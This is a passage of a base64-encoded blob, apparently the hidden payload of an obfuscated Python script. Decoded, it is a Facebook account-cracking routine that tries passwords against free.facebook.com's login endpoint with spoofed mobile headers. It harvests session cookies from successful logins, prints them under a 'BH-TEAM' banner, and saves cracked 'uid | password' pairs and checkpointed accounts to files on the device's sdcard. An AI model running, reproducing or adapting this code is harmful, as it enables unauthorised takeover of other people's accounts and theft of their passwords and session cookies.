HRsKToNCiAgICAjcHJpbnQodXNlcikNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBjcHMNCiAgICBnbG9iYWwgb2tzDQogICAgZ2xvYmFsIHByb3h5DQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgZnJlZV9mYiA9IHNlc3Npb24uZ2V0KCdodHRwczovL2ZyZWUuZmFjZWJvb2suY29tJykudGV4dA0KICAgICAgICAgICAgbG9nX2RhdGEgPSB7DQogICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJsaSI6cmUuc2VhcmNoKCduYW1lPSJsaSIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAidHJ5X251bWJlciI6IjAiLA0KICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLA0KICAgICAgICAgICAgImVtYWlsIjp1aWQsDQogICAgICAgICAgICAicGFzcyI6cHMsDQogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQ0KICAgICAgICAgICAgaGVhZGVyX2ZyZWVmYiA9IHsiYXV0aG9yaXR5IjogJ2ZyZWUuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICJtZXRob2QiOiAnR0VUJywNCiAgICAgICAgICAgICJzY2hlbWUiOiAnaHR0cHMnLA0KICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjknLA0KICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCcsDQogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgIyAnY29va2llJzogJ2RhdHI9endhaVk4b0lwUkptdXNmd2NVWVIzZ2NsOyBzYj16d2FpWTVYS0k2ZFl2ZGlBVDhNZklBekY7IHdkPTk3OXgxODMxOyBkcHI9Mi4zNDM3NTsgZnI9MEZHRmdEY0QyeDNNU1BFYkouLkJqb2diUC5GaC5BQUEuMC4wLkJqdDdqcS5BV1h2ZWdocC1BSScsDQogICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IicsDQogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsDQogICAgICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsDQogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLA0KICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ25hdmlnYXRlJywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdub25lJywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsDQogICAgICAgICAgICAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywNCiAgICAgICAgICAgICd1c2VyLWFnZW50JzogcHJvfQ0KICAgICAgICAgICAgbG8gPSBzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL2xvZ2luL2FzeW5jLz9yZWZzcmM9ZGVwcmVjYXRlZCZsd3Y9MTAwJyxkYXRhPWxvZ19kYXRhLGhlYWRlcnM9aGVhZGVyX2ZyZWVmYikudGV4dA0KICAgICAgICAgICAgbG9nX2Nvb2tpZXM9c2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkua2V5cygpDQogICAgICAgICAgICBpZiAnY191c2VyJyBpbiBsb2dfY29va2llczoNCiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgY2lkID0gY29raVs3OjIyXQ0KICAgICAgICAgICAgICAgIHByaW50KCdcclxyXDAzM1sxOzMybVtCSC1URUFNLU9L8J+Sml0gXDAzM1swOzk3bScrdWlkKydcMDMzWzE7MzJtIHwgXDAzM1swOzkzbScgK3BzKyAgICAnICBcblvigI7igI7wn46vXVwwMzNbMDs5M20gQ09PS0lFID0gXDAzM1sxOzMybScrY29raSsgICcgICcnICBcMDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBjZWtfYXBrKHNlc3Npb24sY29raSkNCiAgICAgICAgICAgICAgICBtYTREMSgnL3NkY2FyZC9CSFQtT0sudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKydcbicpDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjaWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzI0OjM5XQ0KICAgICAgICAgICAgICAgIHByaW50KCdcclxyXDMzWzE7MzBtW0JILVRFQU0tQ1BdICcgK3VpZCsgJyB8ICcgK3BzKyAgICAgICAgICAgJyAgXDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBtYTREMSgnL3NkY2FyZC9CSFQtQ1AudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKycgXG4nKQ0KICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQoY2lkKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGxvb3ArPTENCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyXHIlc3t4fVt7eHJ9QkgtVEVBTXt4fV1bJXN8JXNdW09LOnt4cn0lc3t4fV0nJShILGxvb3AsdGwsbGVuKG9rcykpKSwNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQoNCnh4cigpDQo="))